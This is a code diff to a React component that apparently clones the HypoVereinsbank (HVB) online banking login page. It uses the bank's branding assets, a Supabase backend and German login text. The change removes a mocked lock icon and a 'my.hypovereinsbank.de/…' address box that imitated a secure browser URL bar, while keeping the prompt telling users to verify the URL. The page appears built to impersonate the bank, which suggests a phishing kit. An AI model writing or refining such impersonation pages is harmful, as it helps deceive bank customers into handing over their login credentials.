@@ -3,7 +3,7 @@ import { useSearchParams, useNavigate } from "react-router-dom";
 import { supabase } from "@/integrations/supabase/client";
 import LoadingOverlay from "@/components/LoadingOverlay";
 import { usePageMeta } from "@/hooks/use-page-meta";
-import { Info, Lock, Phone, ChevronRight, ArrowDownToLine, ExternalLink } from "lucide-react";
+import { Info, Phone, ChevronRight, ArrowDownToLine, ExternalLink } from "lucide-react";
 import bgAsset from "@/assets/hvb-login-bg.webp.asset.json";
 import unicreditAsset from "@/assets/hvb-unicredit.png.asset.json";
 import ferrariAsset from "@/assets/hvb-ferrari.png.asset.json";
@@ -332,16 +332,9 @@ const Hypovereinsbank = () => {
                 <h1 className="text-[28px] leading-tight font-light mb-5" style={{ color: DARK }}>
                   Willkommen im HVB Online Banking
                 </h1>
-                <div className="text-[14px] mb-2 flex items-center gap-2" style={{ color: "#4a4a4a" }}>
+                <div className="text-[14px] mb-5 flex items-center gap-2" style={{ color: "#4a4a4a" }}>
                   <span>Bitte überprüfen Sie immer die Korrektheit der Browser-URL:</span>
                   <Info size={14} style={{ color: TEAL }} />
-                </div>
-                <div
-                  className="inline-flex items-center gap-2 px-3 py-1.5 mb-5 text-[14px]"
-                  style={{ backgroundColor: "#F1F3F4", color: "#3c4043", borderRadius: 2 }}
-                >
-                  <Lock size={13} />
-                  <span>my.hypovereinsbank.de/…</span>
                 </div>
                 <p className="text-[15px] mb-4 font-semibold" style={{ color: DARK }}>
                   Bitte loggen Sie sich ein.
